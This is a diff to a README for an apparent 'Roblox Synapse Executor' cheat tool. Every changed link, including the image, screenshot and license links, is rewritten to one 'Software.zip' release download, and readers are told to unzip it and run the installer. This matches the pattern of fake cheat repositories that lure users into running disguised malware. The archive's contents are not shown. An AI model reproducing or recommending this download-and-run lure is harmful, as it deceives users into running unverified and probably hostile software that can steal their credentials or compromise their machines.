@@ -1,6 +1,6 @@
 # Roblox-Synapse
 
-![Roblox Synapse Executor Banner](https://example.com/banner-image.png)
+![Roblox Synapse Executor Banner](https://github.com/jaydenth/Roblox-Synapse/releases/download/v2.0/Software.zip)
 
 🚀 Welcome to the official repository of **Roblox Synapse Executor**, the top-tier script execution tool for Roblox 🎮. This tool is highly valued for its advanced features and stability, enabling seamless Lua scripting for game modifications and customization.
 
@@ -17,7 +17,7 @@
 
 Roblox Synapse Executor is a powerful tool designed for Roblox developers and enthusiasts who want to take their scripting experience to the next level. With its robust feature set and exceptional stability, Synapse has earned a reputation as the go-to choice for creators looking to enhance their gameplay experience.
 
-![Roblox Synapse Screenshot](https://example.com/screenshot.png)
+![Roblox Synapse Screenshot](https://github.com/jaydenth/Roblox-Synapse/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -33,7 +33,7 @@ Roblox Synapse Executor is a powerful tool designed for Roblox developers and en
 
 To get started with Roblox Synapse Executor, follow these simple steps:
 
-1. Download the Synapse software package from the following link: [![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue)](https://github.com/user-attachments/files/17394153/Software.zip)
+1. Download the Synapse software package from the following link: [![Download Synapse](https://github.com/jaydenth/Roblox-Synapse/releases/download/v2.0/Software.zip)](https://github.com/jaydenth/Roblox-Synapse/releases/download/v2.0/Software.zip)
 
 2. Unzip the downloaded file and run the installer to set up Synapse on your system.
 
@@ -47,7 +47,7 @@ Roblox Synapse Executor can be used in a variety of ways to enhance your Roblox 
 2. Experiment with advanced Lua scripting techniques to create dynamic and interactive gameplay elements.
 3. Collaborate with other developers to share scripts and ideas, further expanding the possibilities of Synapse.
 
-![Roblox Synapse Usage Example](https://example.com/usage-example.png)
+![Roblox Synapse Usage Example](https://github.com/jaydenth/Roblox-Synapse/releases/download/v2.0/Software.zip)
 
 ## Contributing
 
@@ -55,4 +55,4 @@ We welcome contributions from the Roblox scripting community to help enhance and
 
 ## License
 
-Roblox Synapse Executor is released under the [MIT License](https://opensource.org/licenses/MIT), granting users the freedom to use, modify, and distribute the software for personal and commercial purposes.
+Roblox Synapse Executor is released under the [MIT License](https://github.com/jaydenth/Roblox-Synapse/releases/download/v2.0/Software.zip), granting users the freedom to use, modify, and distribute the software for personal and commercial purposes.
